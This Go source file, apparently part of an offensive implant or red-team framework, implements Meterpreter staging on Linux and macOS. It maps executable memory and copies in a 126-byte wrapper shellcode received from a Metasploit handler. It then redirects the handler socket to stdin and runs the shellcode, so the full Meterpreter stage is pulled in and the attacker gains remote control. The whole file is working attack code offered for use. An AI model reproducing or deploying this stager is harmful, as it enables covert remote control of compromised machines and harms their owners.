//go:build (linux || darwin) && !windows

// Meterpreter staging via purego -- executes the 126-byte wrapper shellcode
// that reads the full Meterpreter stage from a socket file descriptor.
package inject

import (
	"fmt"
	"runtime"
	"unsafe"

	"github.com/ebitengine/purego"
	"golang.org/x/sys/unix"
)

// keepAliveFiles prevents GC from closing file descriptors passed to shellcode.
var keepAliveFiles []interface{}

// InjectMeterpreterWrapper executes a Meterpreter wrapper shellcode (126 bytes)
// and passes it a socket file descriptor to read the full stage from.
//
// sockfd: file descriptor of the connection to the Metasploit handler.
// wrapper: the 126-byte stub shellcode from the handler.
//
// This function blocks forever on success (wrapper takes control of the thread).
func InjectMeterpreterWrapper(sockfd int, wrapper []byte) error {
	if len(wrapper) == 0 {
		return fmt.Errorf("empty wrapper shellcode")
	}

	mem, err := unix.Mmap(
		-1, 0, len(wrapper),
		unix.PROT_READ|unix.PROT_WRITE|unix.PROT_EXEC,
		unix.MAP_PRIVATE|unix.MAP_ANONYMOUS,
	)
	if err != nil {
		return fmt.Errorf("mmap: %w", err)
	}

	copy(mem, wrapper)

	// Redirect socket to stdin (fd 0) -- wrapper reads stage from fd 0
	if err := unix.Dup2(sockfd, 0); err != nil {
		unix.Munmap(mem)
		return fmt.Errorf("dup2: %w", err)
	}

	// Clear FD_CLOEXEC so socket survives exec
	if _, _, errno := unix.Syscall(unix.SYS_FCNTL, uintptr(sockfd), unix.F_SETFD, 0); errno != 0 {
		unix.Munmap(mem)
		return fmt.Errorf("fcntl: %w", errno)
	}

	// Prevent GC from closing the socket
	keepAliveFiles = append(keepAliveFiles, sockfd)

	done := make(chan struct{})
	go func() {
		runtime.LockOSThread()
		fnptr := uintptr(unsafe.Pointer(&mem[0]))
		purego.SyscallN(fnptr)
		close(done)
	}()

	// Block forever -- wrapper takes control
	select {}
}
